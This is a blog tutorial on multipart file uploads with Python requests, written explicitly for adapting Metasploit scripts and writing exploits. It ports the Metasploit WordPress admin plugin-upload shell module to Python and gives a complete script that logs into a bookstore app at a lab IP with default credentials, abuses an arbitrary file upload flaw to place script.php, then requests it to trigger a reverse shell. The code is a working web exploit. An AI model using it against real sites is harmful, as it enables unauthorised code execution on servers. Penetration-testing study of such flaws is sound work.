---
title: "Tutorial: Uploading Files with Python Requests"
layout: archive
date:   2020-12-31
tags: Python
tags_label: true
---
For Adapting Msf Scripts or Writing Exploits in Python

#### Intro

There is not much documentation on how to interact with multipart forms, this was mostly trial and error. This method was used to automate exploits by logging in to get cookies, upload a reverse shell, and then spawn a listener to connect to it, send and revieve requests (ie. commands and output).

#### Requests Format:

There are two components to the post request: url, and data (ie. form data).  
When we use requests for authentication, we can use Session to handle cookies and session keys.

```python
import requests

# With no authentication required:
data = {
    "id": "1",
    "name": "example"
}

url = "http://example.com"

resp = requests.post(url, data=data)
print(resp.text)

# With authentication:
# First we must login:
url = "http://example.com/login.php"
# Often the backend requires the prescense of the submit button field
data = {
    "user": "admin",
    "pass": "admin",
    "submit": "submit"
}
# Init a session
s = requests.Session()
# When we make the login post request with session it will store the cookies, and session keys
resp = s.post(url, data=data)

# When we make a request the session handles the cookies and session keys
admin_url = "http://example.com/admin.php"
r = s.get(admin_url)
        
```

#### MSF: WP Admin Shell Upload (Plugin Upload) Example:

The original metasploit script

![](/assets/images/tutorials/f1.png)

The python version (snippet file upload portion only)

```python

# First we would login and get a cookie (wp_init_cookies)
# and then we get the nonce (wp_nonce, which is in the actual form, and required for the request) 
url_admin_update = "{}/update.php?action=upload-plugin".format(wp_admin_addr)
   
# format of a key-value pair in data is: "[field name]": ("[file name]", "[file stream]", "[content type]", "[per part headers]")
# field name refers to the name attribute of the field in the form (ex. <input name="firstname">)
# the server usually doesn't use the filename, and instead names the file something random 
# we also use this format for any other fields in the form

# WordPress requires a nonce, and the referrer field in order for the request to be successful
data = {
    '_wpnonce': (None, wp_nonce),
    '_wp_http_referer': (None, "/wordpress/wp-admin/plugin-install.php?tab=upload"),
    'install-plugin-submit': (None, 'Install Now'),
    'pluginzip': (resource_path, open(resource_path, 'rb'), "application/octet-stream")
}

resp =  requests.post(url_admin_update, files=data, cookies=wp_init_cookies)
print(resp.status_code)
```

#### Another Example:

This form is vulnerable to arbitrary file upload. We can upload a file containing a reverse shell.

![](/assets/images/tutorials/f2.png)

This form has several mandatory fields

*   title

*   author

*   image -> the file

*   price

*   publisher

*   The save\_change field also must be present or the server throws an error. (this is only applicable when the book is not new). This example is for an existing book... but for a new book we would change the url to add\_book.php, and change the save change field to "add": (None, "Add new book") to match this form.

![](/assets/images/tutorials/f3.png)

Complete code for the exploit, first we login, make the request, and then visit the url of the uploaded file.

```python
import requests

# Login:
url = "http://192.168.99.99/admin_verify.php"
data = {
"name": "admin",
"pass": "admin",
"submit": "submit"
}
s = requests.Session()
resp = s.post(url, data=data)

# Go the book we are editting (not necessary)
book_url = "http://192.168.99.99/admin_edit.php?bookisbn=978-1-49192-706-9"
resp = s.get(book_url)

edit_book_url = "http://192.168.99.99/edit_book.php"
curr_dir = os.path.dirname(os.path.abspath(__file__))
resource_path = os.path.join(curr_dir, "script.php")

# the form data:
files = {
    "image": ("script.php", open(resource_path, 'rb'), "application/octet-stream"),
    "isbn": (None, "978-1-49192-706-9"),
    "title": (None, "C# 6.0 in a Nutshell, 6th Edition"),
    "author": (None, "Joseph Albahari, Ben Albahari"),
    "price": (None, "20.00"),
    "publisher": (None, "O''Reilly Media"),
    "save_change": (None, "save_change")
}

# make the post request:
resp = s.post(edit_book_url, files=files)
print(resp.text)
print(resp.status_code)

# Visit the location of the uploaded file: (if was a reverse shell we would start a listener first)
script_dir = "http://192.168.99.99/bootstrap/img/script.php"
resp = s.get(script_dir)
print(resp.text)          
```